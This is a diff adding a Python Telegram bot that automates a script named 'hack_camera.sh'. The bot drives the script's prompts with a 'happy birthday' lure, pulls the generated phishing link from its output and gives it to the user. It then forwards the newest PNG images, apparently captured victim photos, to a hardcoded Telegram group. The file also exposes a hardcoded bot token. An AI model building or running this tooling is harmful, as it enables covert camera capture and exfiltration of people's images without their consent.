@@ -1,0 +1,117 @@
+import asyncio
+import subprocess
+import os
+import glob
+import time
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command
+
+TOKEN = "8425275738:AAEhH_lpv-vmReyrKs4RdknJuHUKISII76Y"
+GROUP_ID = -1002912161779  # ID nhóm gửi ảnh
+COOLDOWN_HOURS = 12
+
+bot = Bot(token=TOKEN)
+dp = Dispatcher()
+
+# lưu cooldown cho mỗi user
+user_last_use = {}
+
+
+def get_newest_pngs():
+    folder = os.path.expanduser("~/Pictures")
+    files = glob.glob(os.path.join(folder, "*.png"))
+    if not files:
+        return []
+    files.sort(key=os.path.getmtime, reverse=True)
+    return files[:5]  # tối đa 5 file mới nhất
+
+
+async def run_script_and_send_output(bot, chat_id):
+    proc = await asyncio.create_subprocess_exec(
+        "./hack_camera.sh",
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
+
+    output_lines = []
+
+    async def read_output():
+        while True:
+            line = await proc.stdout.readline()
+            if not line:
+                break
+            text = line.decode(errors="ignore").strip()
+            output_lines.append(text)
+            print("LOG:", text)  # debug nếu muốn
+
+    read_task = asyncio.create_task(read_output())
+
+    # sleep 5s rồi nhập 2
+    await asyncio.sleep(5)
+    proc.stdin.write(b"2\n")
+    await proc.stdin.drain()
+
+    # sleep 5s rồi nhập "happy birthday"
+    await asyncio.sleep(5)
+    proc.stdin.write(b"happy birthday\n")
+    await proc.stdin.drain()
+
+    # đợi thêm 1s để output kịp sinh ra
+    await asyncio.sleep(1)
+
+    # gửi output hiện tại cho user
+    if output_lines:
+        msg_text = "\n".join(output_lines)
+        await bot.send_message(chat_id, f"Output sau khi nhập happy birthday:\n{msg_text}")
+
+    # đợi script kết thúc
+    await proc.wait()
+    read_task.cancel()
+
+    # quét link trong output
+    link = None
+    for line in output_lines:
+        if line.startswith("https://"):
+            link = line
+            break
+
+    return link
+
+
+@dp.message(Command("hi"))
+async def hi_command(msg: types.Message):
+    uid = msg.from_user.id
+    now = time.time()
+
+    # check cooldown 12h
+    if uid in user_last_use and now - user_last_use[uid] < COOLDOWN_HOURS * 3600:
+        remain = int((COOLDOWN_HOURS*3600 - (now - user_last_use[uid])) / 60)
+        await msg.reply(f"Bạn cần chờ {remain} phút nữa để dùng lại /hi")
+        return
+
+    user_last_use[uid] = now
+    await msg.reply("Đang chạy tool, vui lòng đợi...")
+
+    # chạy script, gửi output ngay sau khi nhập happy birthday
+    link = await run_script_and_send_output(bot, msg.chat.id)
+
+    # gửi link nếu có
+    if link:
+        await msg.answer(f"Link quét được:\n{link}")
+
+    # gửi PNG mới nhất
+    png_files = get_newest_pngs()
+    if png_files:
+        for f in png_files:
+            await bot.send_photo(GROUP_ID, photo=open(f, "rb"))
+    else:
+        await msg.answer("Không có file PNG mới nào trong Pictures")
+
+
+async def main():
+    await dp.start_polling(bot)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
